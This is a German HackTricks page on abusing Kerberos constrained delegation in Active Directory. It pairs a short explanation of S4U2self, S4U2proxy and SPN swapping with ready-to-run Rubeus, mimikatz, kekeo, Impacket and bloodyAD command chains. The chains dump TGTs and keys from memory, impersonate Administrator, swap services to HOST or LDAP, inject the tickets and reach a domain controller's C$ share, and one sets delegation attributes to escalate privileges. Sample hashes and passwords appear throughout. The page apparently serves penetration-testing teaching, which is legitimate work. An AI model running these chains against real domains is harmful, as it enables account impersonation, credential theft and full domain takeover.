# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

Damit kann ein Domain admin einem **Computer erlauben**, sich gegenüber jedem **Service** eines Computers als **Benutzer oder Computer auszugeben**.

- **Service for User to self (_S4U2self_):** Jedes **Servicekonto, das einen SPN besitzt**, kann normalerweise im Namen eines beliebigen Benutzers ein TGS für sich selbst abrufen. Wenn das Konto außerdem [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) in _userAccountControl_ besitzt, ist dieser TGS **forwardable**, wodurch der Protocol Transition für die **classic constrained delegation** direkt nutzbar wird.
- **Service for User to Proxy(_S4U2proxy_):** Ein **Servicekonto** kann im Namen eines Benutzers einen TGS für die in **msDS-AllowedToDelegateTo** aufgeführten SPNs abrufen. Das in S4U2Proxy verwendete Evidence Ticket muss ein **forwardable** Ticket für den delegierenden Service sein: entweder ein echtes, vom Opfer abgefangenes Client-to-Service-Ticket oder eines, das mit **S4U2Self + T2A4D** erzeugt wurde.

**Hinweis**: Wenn ein Benutzer in AD als „_Account is sensitive and cannot be delegated_“ markiert ist oder Mitglied von **Protected Users** ist, kannst du dich über Constrained Delegation normalerweise **nicht als dieser Benutzer ausgeben**. In modernen Domains solltest du bei der Zielauswahl von delegation-enabled Konten **AES**-Material gegenüber Annahmen zu ausschließlich RC4 bevorzugen.

Das bedeutet: Wenn du den **Hash des Servicekontos kompromittierst**, kannst du dich als **Benutzer ausgeben** und in deren Namen **Zugriff** auf jeden **Service** über die angegebenen Computer erlangen (mögliche **privesc**).

Außerdem hast du **nicht nur Zugriff auf den Service, als den sich der Benutzer ausgeben kann, sondern auch auf jeden anderen Service**, weil der SPN (der angeforderte Servicename) nicht überprüft wird (dieser Teil ist im Ticket nicht verschlüsselt/signiert). Wenn du daher Zugriff auf den **CIFS Service** hast, kannst du beispielsweise über das `/altservice`-Flag in Rubeus auch Zugriff auf den **HOST Service** erhalten. Dieselbe Schwachstelle beim Austauschen von SPNs wird von **Impacket getST -altservice** und anderen Tools ausgenutzt.

Außerdem wird **LDAP service access on DC** benötigt, um einen **DCSync** auszunutzen.
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Linux / LDAP enumeration
# NetExec: enumerate constrained / unconstrained / RBCD in one shot
nxc ldap dc.corp.local -u user -p 'Password123!' --find-delegation

# bloodyAD / msldap: LDAP-first enumeration from Linux
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap constrained
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap s4u2proxy
```
**Hinweis für Operatoren:** Vertraue bei der Überprüfung von **gMSA/sMSA** nicht allein auf Screenshots aus **ADUC** oder BloodHound. Diese Konten blenden den üblichen Tab „Delegation“ häufig aus. Ermittle daher die rohen Attribute **`userAccountControl`** und **`msDS-AllowedToDelegateTo`** direkt.
```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
### Protocol-transition vs. Kerberos-only constrained delegation

Wenn der kompromittierte Account über **T2A4D** verfügt, kann die vollständige **`S4U2Self -> S4U2Proxy`**-Kette normalerweise nur mit dem Service-Key/TGT abgeschlossen werden.

Wenn er nur über **`msDS-AllowedToDelegateTo`** verfügt (der klassische Modus **„Use Kerberos only“**), kann die delegation dennoch missbraucht werden. Das Evidence-Ticket für S4U2Proxy muss jedoch ein **echtes forwardable User-to-Service-Ticket** für den delegating service sein. In der Praxis bedeutet das, ein Victim-TGS aus **LSASS/ccache** zu stehlen oder abzufangen und es in die zweite Phase einzuspeisen (`/tgs:` in Rubeus). Ein **non-forwardable** S4U2Self-Ticket ist für classic constrained delegation **nicht** ausreichend. Wenn dies dein einziges Evidence-Ticket ist, prüfe stattdessen [Resource-based Constrained Delegation](resource-based-constrained-delegation.md).

### Hinweise zu Cross-domain constrained delegation (2025+)

Seit **Windows Server 2012/2012 R2** unterstützt der KDC **constrained delegation über Domains/Forests hinweg** mittels S4U2Proxy-Erweiterungen. Moderne Builds (Windows Server 2016–2025) behalten dieses Verhalten bei und fügen zwei PAC-SIDs hinzu, um protocol transition zu signalisieren:

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**), wenn sich der Benutzer normal authentifiziert hat.
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**), wenn ein Service die Identität über protocol transition bestätigt hat.

Erwarte `SERVICE_ASSERTED_IDENTITY` innerhalb des PAC, wenn protocol transition domainübergreifend verwendet wird. Dies bestätigt, dass der S4U2Proxy-Schritt erfolgreich war.

### Impacket / Linux tooling (altservice & full S4U)

Aktuelle Impacket-Versionen (0.11.x+) stellen dieselbe S4U-Kette und dasselbe SPN-Swapping wie Rubeus bereit:
```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
-impersonate Administrator contoso.local/websvc$ \
-hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'

# If you already have a ticket/ccache for the right host, rewrite only the service class offline
# (same SPN-swapping idea as Rubeus /altservice)
tgssub.py -in Administrator.ccache -out Administrator_HOST.ccache -altservice host/dc.contoso.local
export KRB5CCNAME=Administrator_HOST.ccache
```
Wenn du es vorziehst, zuerst das Benutzer-ST zu fälschen (z. B. nur mit einem Offline-Hash), kombiniere **ticketer.py** mit **getST.py** für S4U2Proxy. `tgssub.py` ist ebenfalls hilfreich, wenn du bereits über einen funktionierenden ccache verfügst und nur die Serviceklasse für denselben Host austauschen musst. Siehe das offene Impacket-Issue #1713 für aktuelle Besonderheiten (KRB_AP_ERR_MODIFIED, wenn das gefälschte ST nicht zum SPN-Schlüssel passt).

### Delegation-Setup mit Credentials eines Benutzers mit niedrigen Berechtigungen automatisieren

Wenn du bereits **GenericAll/WriteDACL** für ein Computer- oder Servicekonto besitzt, kannst du die erforderlichen Attribute remote ohne RSAT setzen, indem du **bloodyAD** (2024+) verwendest:
```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```
Damit kannst du einen Pfad für **constrained delegation** zur **privesc** erstellen, ohne DA-Privilegien zu benötigen, sobald du diese Attribute schreiben kannst.

- Schritt 1: **TGT des erlaubten Dienstes abrufen**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> Es gibt **andere Möglichkeiten, ein TGT-Ticket** oder **RC4** bzw. **AES256** zu erhalten, ohne SYSTEM auf dem Computer zu sein, z. B. durch den Printer Bug und unconstrained delegation, NTLM relaying und den Missbrauch von Active Directory Certificate Service.
>
> **Allein mit diesem TGT-Ticket (oder Hash) kannst du diesen Angriff durchführen, ohne den gesamten Computer zu kompromittieren.**

- Schritt 2: **TGS für den Service erhalten, indem der Benutzer imitiert wird**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**Weitere Informationen bei ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) und [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)

## Referenzen
- [Übersicht über die eingeschränkte Kerberos-Delegierung (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [Delegation mit Impacket missbrauchen (Teil 2): Eingeschränkte Delegation (Black Hills, 2025)](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)

{{#include ../../banners/hacktricks-training.md}}
